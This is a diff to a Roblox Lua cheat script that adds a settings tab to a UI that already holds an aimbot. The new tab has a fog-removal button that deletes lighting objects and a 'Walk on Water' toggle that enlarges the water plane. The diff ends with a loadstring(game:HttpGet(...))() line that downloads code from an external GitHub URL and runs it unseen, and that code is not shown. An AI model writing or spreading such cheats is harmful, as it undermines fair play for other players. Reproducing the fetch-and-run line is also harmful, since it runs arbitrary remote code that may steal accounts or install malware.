@@ -10,6 +10,10 @@ local Player = Window:MakeTab({
     Title = "Local Player",
     Icon = "rbxassetid://13075651575"
 })
+local Setting = Window:MakeTab({
+    Title = "Setting & UI",
+    Icon = "rbxassetid://7734053495"
+})
 	Player:AddSection({"Aimbot"});
 
 local RunService = game:GetService("RunService")
@@ -295,3 +299,37 @@ Player:AddToggle({
         end
     end
 })
+Setting:AddButton({ 
+      Name = "Nofog", 
+      Description = "", 
+      Callback = function()
+		if Lighting:FindFirstChild("LightingLayers") then
+			Lighting.LightingLayers:Destroy();
+		end;
+		if Lighting:FindFirstChild("SeaTerrorCC") then
+			Lighting.SeaTerrorCC:Destroy();
+		end;
+		if Lighting:FindFirstChild("FantasySky") then
+			Lighting.FantasySky:Destroy();
+		end;
+	end });
+Setting:AddToggle({
+	Name = "Walk on Water",
+	Description = "walk on water", 
+	Default = true,
+	Callback = function(I)
+		_G.WalkWater_Part = I;
+		local e = (game:GetService("Workspace")).Map["WaterBase-Plane"];
+		if _G.WalkWater_Part then
+			e.Size = Vector3.new(1000, 112, 1000);
+		else
+			e.Size = Vector3.new(1000, 80, 1000);
+		end;
+	end,
+});
+
+-- =========================
+-- TOGGLE UI
+-- =========================
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ohmay5/Main/refs/heads/main/attach.txt"))()
